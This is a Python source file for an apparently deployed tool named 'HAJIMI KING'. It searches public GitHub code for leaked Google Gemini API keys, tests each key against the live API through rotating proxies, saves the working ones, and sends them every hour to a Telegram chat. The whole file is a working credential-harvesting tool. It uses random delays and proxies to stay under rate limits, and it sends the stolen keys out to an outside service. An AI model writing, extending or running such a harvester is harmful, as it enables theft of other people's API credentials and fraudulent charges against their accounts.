import os
import random
import re
import sys
import time
import traceback
import threading
import requests
from datetime import datetime, timedelta
from typing import Dict, List, Union, Any
from http.server import BaseHTTPRequestHandler, HTTPServer

import google.generativeai as genai
from google.api_core import exceptions as google_exceptions

from common.Logger import logger

sys.path.append('../')
from common.config import Config
from utils.github_client import GitHubClient
from utils.file_manager import file_manager, Checkpoint, checkpoint
from utils.sync_utils import sync_utils

# --- 新增：Telegram 定时发送相关变量 ---
LAST_TG_SEND_TIME = time.time()
PENDING_KEYS_TO_SEND = []

# 创建GitHub工具实例和文件管理器
github_utils = GitHubClient.create_instance(Config.GITHUB_TOKENS)

# 统计信息
skip_stats = {
    "time_filter": 0,
    "sha_duplicate": 0,
    "age_filter": 0,
    "doc_filter": 0
}

# --- 新增：健康检查 Web 服务类 (适配 Koyeb) ---
class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"OK")
    def log_message(self, format, *args):
        return  # 禁用日志

def start_health_check_server():
    port = int(os.environ.get("PORT", 8000))
    server = HTTPServer(('0.0.0.0', port), HealthCheckHandler)
    logger.info(f"👻 Health check server started on port {port}")
    server.serve_forever()

# --- 新增：Telegram 汇总发送函数 (支持长消息分段) ---
def send_telegram_summary():
    global LAST_TG_SEND_TIME, PENDING_KEYS_TO_SEND
    
    token = os.getenv("TG_BOT_TOKEN")
    chat_id = os.getenv("TG_CHAT_ID")
    
    if not token or not chat_id or not PENDING_KEYS_TO_SEND:
        PENDING_KEYS_TO_SEND = []
        LAST_TG_SEND_TIME = time.time()
        return

    header = f"📊 【每小时抓取汇总】\n"
    header += f"⏰ 时间: {datetime.now().strftime('%m-%d %H:%M')}\n"
    header += f"✨ 新发现有效 Key: {len(PENDING_KEYS_TO_SEND)} 个\n\n"
    
    all_keys_text = "\n".join(PENDING_KEYS_TO_SEND)
    full_message = header + all_keys_text
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    
    try:
        MAX_LENGTH = 3500 # Telegram 限制为 4096，取 3500 留余量
        if len(full_message) <= MAX_LENGTH:
            requests.post(url, json={"chat_id": chat_id, "text": full_message}, timeout=15)
        else:
            parts = [full_message[i:i+MAX_LENGTH] for i in range(0, len(full_message), MAX_LENGTH)]
            for index, part in enumerate(parts):
                msg_text = part
                if len(parts) > 1:
                    msg_text = f"📦 部分 {index+1}/{len(parts)}：\n\n" + part
                requests.post(url, json={"chat_id": chat_id, "text": msg_text}, timeout=15)
                time.sleep(1) 
                
        logger.info(f"📤 已向 Telegram 发送汇总报告，共计 {len(PENDING_KEYS_TO_SEND)} 个 Key")
    except Exception as e:
        logger.error(f"❌ Telegram 发送失败: {e}")
    
    PENDING_KEYS_TO_SEND = []
    LAST_TG_SEND_TIME = time.time()

def normalize_query(query: str) -> str:
    query = " ".join(query.split())
    parts = []
    i = 0
    while i < len(query):
        if query[i] == '"':
            end_quote = query.find('"', i + 1)
            if end_quote != -1:
                parts.append(query[i:end_quote + 1])
                i = end_quote + 1
            else:
                parts.append(query[i])
                i += 1
        elif query[i] == ' ':
            i += 1
        else:
            start = i
            while i < len(query) and query[i] != ' ':
                i += 1
            parts.append(query[start:i])

    quoted_strings, language_parts, filename_parts, path_parts, other_parts = [], [], [], [], []
    for part in parts:
        if part.startswith('"') and part.endswith('"'): quoted_strings.append(part)
        elif part.startswith('language:'): language_parts.append(part)
        elif part.startswith('filename:'): filename_parts.append(part)
        elif part.startswith('path:'): path_parts.append(part)
        elif part.strip(): other_parts.append(part)

    normalized_parts = sorted(quoted_strings) + sorted(other_parts) + sorted(language_parts) + sorted(filename_parts) + sorted(path_parts)
    return " ".join(normalized_parts)

def extract_keys_from_content(content: str) -> List[str]:
    pattern = r'(AIzaSy[A-Za-z0-9\-_]{33})'
    return re.findall(pattern, content)

def should_skip_item(item: Dict[str, Any], checkpoint: Checkpoint) -> tuple[bool, str]:
    if checkpoint.last_scan_time:
        try:
            last_scan_dt = datetime.fromisoformat(checkpoint.last_scan_time)
            repo_pushed_at = item["repository"].get("pushed_at")
            if repo_pushed_at:
                repo_pushed_dt = datetime.strptime(repo_pushed_at, "%Y-%m-%dT%H:%M:%SZ")
                if repo_pushed_dt <= last_scan_dt:
                    skip_stats["time_filter"] += 1
                    return True, "time_filter"
        except: pass

    if item.get("sha") in checkpoint.scanned_shas:
        skip_stats["sha_duplicate"] += 1
        return True, "sha_duplicate"

    repo_pushed_at = item["repository"].get("pushed_at")
    if repo_pushed_at:
        repo_pushed_dt = datetime.strptime(repo_pushed_at, "%Y-%m-%dT%H:%M:%SZ")
        if repo_pushed_dt < datetime.utcnow() - timedelta(days=Config.DATE_RANGE_DAYS):
            skip_stats["age_filter"] += 1
            return True, "age_filter"

    lowercase_path = item["path"].lower()
    if any(token in lowercase_path for token in Config.FILE_PATH_BLACKLIST):
        skip_stats["doc_filter"] += 1
        return True, "doc_filter"

    return False, ""

def process_item(item: Dict[str, Any]) -> tuple:
    delay = random.uniform(1, 4)
    file_url = item["html_url"]
    repo_name = item["repository"]["full_name"]
    file_path = item["path"]
    time.sleep(delay)

    content = github_utils.get_file_content(item)
    if not content:
        logger.warning(f"⚠️ Failed to fetch content for file: {file_url}")
        return 0, 0

    keys = extract_keys_from_content(content)
    filtered_keys = []
    for key in keys:
        context_index = content.find(key)
        if context_index != -1:
            snippet = content[context_index:context_index + 45]
            if "..." in snippet or "YOUR_" in snippet.upper(): continue
        filtered_keys.append(key)
    
    keys = list(set(filtered_keys))
    if not keys: return 0, 0

    logger.info(f"🔑 Found {len(keys)} suspected key(s), validating...")
    valid_keys, rate_limited_keys = [], []

    for key in keys:
        validation_result = validate_gemini_key(key)
        if validation_result and "ok" in validation_result:
            valid_keys.append(key)
            logger.info(f"✅ VALID: {key}")
        elif validation_result == "rate_limited":
            rate_limited_keys.append(key)
            logger.warning(f"⚠️ RATE LIMITED: {key}")
        else:
            logger.info(f"❌ INVALID: {key}")

    if valid_keys:
        file_manager.save_valid_keys(repo_name, file_path, file_url, valid_keys)
        # --- 存入 Telegram 发送缓冲区 ---
        PENDING_KEYS_TO_SEND.extend(valid_keys)
        try:
            sync_utils.add_keys_to_queue(valid_keys)
        except Exception as e:
            logger.error(f"📥 Error adding keys: {e}")

    if rate_limited_keys:
        file_manager.save_rate_limited_keys(repo_name, file_path, file_url, rate_limited_keys)

    return len(valid_keys), len(rate_limited_keys)

def validate_gemini_key(api_key: str) -> Union[bool, str]:
    try:
        time.sleep(random.uniform(0.5, 1.5))
        proxy_config = Config.get_random_proxy()
        client_options = {"api_endpoint": "generativelanguage.googleapis.com"}
        if proxy_config: os.environ['grpc_proxy'] = proxy_config.get('http')

        genai.configure(api_key=api_key, client_options=client_options)
        model = genai.GenerativeModel(Config.HAJIMI_CHECK_MODEL)
        model.generate_content("hi")
        return "ok"
    except (google_exceptions.PermissionDenied, google_exceptions.Unauthenticated): return "not_authorized_key"
    except google_exceptions.TooManyRequests: return "rate_limited"
    except Exception as e:
        if any(x in str(e).lower() for x in ["429", "rate limit", "quota"]): return "rate_limited:429"
        elif any(x in str(e) for x in ["403", "SERVICE_DISABLED", "API has not been used"]): return "disabled"
        else: return f"error:{e.__class__.__name__}"

def print_skip_stats():
    total_skipped = sum(skip_stats.values())
    if total_skipped > 0:
        logger.info(f"📊 Skipped {total_skipped} items - Time: {skip_stats['time_filter']}, Duplicate: {skip_stats['sha_duplicate']}, Age: {skip_stats['age_filter']}, Docs: {skip_stats['doc_filter']}")

def reset_skip_stats():
    global skip_stats
    skip_stats = {"time_filter": 0, "sha_duplicate": 0, "age_filter": 0, "doc_filter": 0}

def main():
    # --- 启动 Koyeb 健康检查 ---
    threading.Thread(target=start_health_check_server, daemon=True).start()

    start_time = datetime.now()
    logger.info("=" * 60)
    logger.info("🚀 HAJIMI KING STARTING")
    logger.info("=" * 60)

    if not Config.check() or not file_manager.check():
        logger.info("❌ Pre-check failed. Exiting...")
        sys.exit(1)

    search_queries = file_manager.get_search_queries()
    logger.info(f"🔑 Tokens: {len(Config.GITHUB_TOKENS)} | 🔍 Queries: {len(search_queries)}")

    total_keys_found, total_rate_limited_keys, loop_count = 0, 0, 0

    while True:
        try:
            loop_count += 1
            logger.info(f"🔄 Loop #{loop_count} - {datetime.now().strftime('%H:%M:%S')}")
            query_count, loop_processed_files = 0, 0
            reset_skip_stats()

            for i, q in enumerate(search_queries, 1):
                normalized_q = normalize_query(q)
                if normalized_q in checkpoint.processed_queries:
                    logger.info(f"🔍 Skipping already processed query: [{q}], index:#{i}")
                    continue

                res = github_utils.search_for_keys(q)
                if res and "items" in res:
                    items = res["items"]
                    if items:
                        query_valid_keys, query_rate_limited_keys, query_processed = 0, 0, 0
                        for item_index, item in enumerate(items, 1):
                            if item_index % 20 == 0:
                                logger.info(f"📈 Progress: {item_index}/{len(items)} | query: {q} | current valid: {query_valid_keys} | total valid: {total_keys_found}")
                                file_manager.save_checkpoint(checkpoint)
                                file_manager.update_dynamic_filenames()

                            should_skip, skip_reason = should_skip_item(item, checkpoint)
                            if should_skip:
                                logger.info(f"🚫 Skipping item, name: {item.get('path','').lower()}, index:{item_index} - reason: {skip_reason}")
                                continue

                            valid_count, rate_limited_count = process_item(item)
                            query_valid_keys += valid_count
                            query_rate_limited_keys += rate_limited_count
                            query_processed += 1
                            checkpoint.add_scanned_sha(item.get("sha"))
                            loop_processed_files += 1

                        total_keys_found += query_valid_keys
                        total_rate_limited_keys += query_rate_limited_keys
                        if query_processed > 0:
                            logger.info(f"✅ Query {i}/{len(search_queries)} complete - Processed: {query_processed}, Valid: +{query_valid_keys}")
                    else:
                        logger.info(f"📭 Query {i}/{len(search_queries)} - No items found")

                checkpoint.add_processed_query(normalized_q)
                query_count += 1
                checkpoint.update_scan_time()
                file_manager.save_checkpoint(checkpoint)
                file_manager.update_dynamic_filenames()
                
                if query_count % 5 == 0:
                    time.sleep(1)

            logger.info(f"🏁 Loop #{loop_count} complete | Total Valid: {total_keys_found}")
            
            # --- 检查是否到了一小时，发送 Telegram 汇总 ---
            if time.time() - LAST_TG_SEND_TIME >= 3600:
                logger.info("🕒 Checking for hourly Telegram summary...")
                send_telegram_summary()

            time.sleep(10)

        except KeyboardInterrupt:
            sync_utils.shutdown()
            break
        except Exception as e:
            logger.error(f"💥 Unexpected error: {e}")
            time.sleep(10)
            continue

if __name__ == "__main__":
    main()
